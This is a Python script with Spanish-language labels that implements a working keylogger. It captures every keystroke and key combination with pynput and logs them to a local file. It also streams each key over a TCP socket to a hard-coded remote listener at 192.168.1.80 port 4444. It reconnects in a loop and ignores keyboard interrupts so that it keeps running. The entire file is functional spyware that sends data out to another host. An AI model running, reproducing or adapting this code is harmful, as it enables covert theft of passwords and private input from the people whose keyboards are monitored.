import os
import time
import json
import socket
from utils import printcolor
from datetime import datetime
from pynput.keyboard import Listener, Key, KeyCode

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')



def start(dIP=None, dPort=4444):
    clear()
    ip = dIP
    puerto = dPort
    estado = None
    
    while True:
        try:
            if estado != "esperando":
                printcolor.println("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] ESPERANDO CONEXIÓN", justify="left",style="bold cyan")
                estado = "esperando"

            sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sck.connect((ip, puerto))

            printcolor.println("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] CONECTADO", justify="left", style="bold green")
            estado = "conectado"

            while True:
                try:
                    def keyboard_listener(key):
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        if hasattr(key, 'char') and key.char is not None:
                            char = key.char
                            log_entry = f"{timestamp} - CHAR: '{char}'\n"
                            ncatOut = char.replace("'", "")
                            
                        else:
                            key_mapping = {
                                Key.space: " [ESPACIO] ",
                                Key.enter: " [ENTER] ",
                                Key.backspace: " [BORRAR] ",
                                Key.tab: " [TAB] ",
                                Key.caps_lock: " [BLOQ_MAYUS] ",
                                Key.shift: " [SHIFT] ",
                                Key.shift_r: " [SHIFT_DER] ",
                                Key.ctrl: " [CTRL] ",
                                Key.ctrl_l: " [CTRL_IZQ] ",
                                Key.ctrl_r: " [CTRL_DER] ",
                                Key.alt: " [ALT] ",
                                Key.alt_l: " [ALT_IZQ] ",
                                Key.alt_r: " [ALT_DER] ",
                                Key.cmd: " [WIN] ",
                                Key.esc: " [ESC] ",
                                Key.delete: " [SUPR] ",
                                Key.home: " [INICIO] ",
                                Key.end: " [FIN] ",
                                Key.page_up: " [RE_PAG] ",
                                Key.page_down: " [AV_PAG] ",
                                Key.up: " [ARRIBA] ",
                                Key.down: " [ABAJO] ",
                                Key.left: " [IZQUIERDA] ",
                                Key.right: " [DERECHA] ",
                                Key.f1: " [F1] ", Key.f2: " [F2] ", Key.f3: " [F3] ",
                                Key.f4: " [F4] ", Key.f5: " [F5] ", Key.f6: " [F6] ",
                                Key.f7: " [F7] ", Key.f8: " [F8] ", Key.f9: " [F9] ",
                                Key.f10: " [F10] ", Key.f11: " [F11] ", Key.f12: " [F12] ",
                                Key.num_lock: " [BLOQ_NUM] ",
                                Key.scroll_lock: " [BLOQ_DESPL] ",
                                Key.pause: " [PAUSA] ",
                                Key.insert: " [INSERTAR] ",
                                Key.menu: " [MENU] ",
                                Key.media_play_pause: " [REPRODUCIR/PAUSAR] ",
                                Key.media_volume_up: " [SUBIR_VOLUMEN] ",
                                Key.media_volume_down: " [BAJAR_VOLUMEN] ",
                                Key.media_volume_mute: " [SILENCIAR] ",
                                Key.media_next: " [SIGUIENTE] ",
                                Key.media_previous: " [ANTERIOR] "
                            }
                            key_str = key_mapping.get(key, f" [TECLA_DESCONOCIDA: {key}] ")
                            log_entry = f"{timestamp} - KEY: {key_str}\n"
                            ncatOut = key_str.replace("'", "")
                        
                        with open("log.txt", 'a', encoding='utf-8') as file:
                            sck.send(ncatOut.encode())
                            file.write(log_entry)

                    def save_to_json(data):
                        with open("log.json", 'a', encoding='utf-8') as file:
                            json.dump(data, file, ensure_ascii=False)
                            file.write('\n')

                    class KeyComboDetector:
                        def __init__(self):
                            self.pressed_keys = set()
                            self.combos = {
                                frozenset([Key.ctrl, 'c']): " [COPIAR] ",
                                frozenset([Key.ctrl, 'v']): " [PEGAR] ",
                                frozenset([Key.ctrl, 'x']): " [CORTAR] ",
                                frozenset([Key.ctrl, 'z']): " [DESHACER] ",
                                frozenset([Key.ctrl, 'y']): " [REHACER] ",
                                frozenset([Key.ctrl, 's']): " [GUARDAR] ",
                                frozenset([Key.alt, 'tab']): " [CAMBIAR_VENTANA] ",
                                frozenset([Key.ctrl, 'alt', 'supr']): " [ADMIN_TAREAS] ",
                                frozenset([Key.ctrl, 'shift', 'esc']): " [ADMIN_TAREAS] ",
                            }
                        
                        def on_press(self, key):
                            self.pressed_keys.add(key)
                            if len(self.pressed_keys) > 1:
                                for combo, action in self.combos.items():
                                    if combo.issubset(self.pressed_keys):
                                        with open("log.txt", 'a', encoding='utf-8') as file:
                                            file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - COMBO: {action}\n")
                        
                        def on_release(self, key):
                            self.pressed_keys.discard(key)

                    combo_detector = KeyComboDetector()

                    def enhanced_listener(key):
                        keyboard_listener(key)
                        combo_detector.on_press(key)

                    printcolor.println("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] INICIANDO KEYLOGGER", justify="left", style="bold cyan")
                    try:
                        with Listener(on_press=enhanced_listener, on_release=combo_detector.on_release) as listener:
                            listener.join()
                    except KeyboardInterrupt:
                        printcolor.println("[bold white][[/bold white][blink bold red]![/blink bold red][bold white]][/bold white] KEYLOGGER DETENIDO", justify="left", style="bold red")
                        continue

                except (BrokenPipeError, ConnectionResetError):
                    continue
                except KeyboardInterrupt:
                    continue

        except (ConnectionRefusedError, OSError):
            pass
        except KeyboardInterrupt:
            continue

        if estado == "conectado":
            printcolor.println("[bold white][[/bold white][blink bold red]![/blink bold red][bold white]][/bold white] SE CERRÓ LA CONEXIÓN", style="bold red")
            estado = None 

        try:
            sck.close()
        except:
            pass

        try:
            time.sleep(1)
        except KeyboardInterrupt:
            continue

start(dIP="192.168.1.80", dPort=4444)
